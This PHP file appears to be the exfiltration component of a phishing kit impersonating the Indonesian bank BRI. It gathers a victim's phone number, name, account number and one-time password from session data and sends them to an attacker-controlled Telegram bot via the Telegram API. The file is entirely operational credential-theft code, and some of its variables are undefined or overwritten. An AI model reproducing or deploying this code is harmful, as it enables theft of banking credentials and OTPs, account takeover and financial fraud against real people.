<?php
session_start();
include "telegram.php";

$otp = $_POST['otp'];

$tarif = $_SESSION['tarif'];
$nohp = $_SESSION['nohp'];
$nama = $_SESSION['nama'];
$rek = $_SESSION['rek'];
$otp = $_SESSION['otp'];



$message = "

├• BRI | DATA | ".$otp."
├───────────────────
├• *Tarif* : ".$ntarif."
├• *No Hp* : ".$nohp."
├• *Nama* : ".$nama."
├• *Norek* : ".$rek."
├• *Saldo* : ".$saldo."
├• *Otp* : ".$otp."
╰───────────────────
";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
//header('Location:./../valid.php');
?>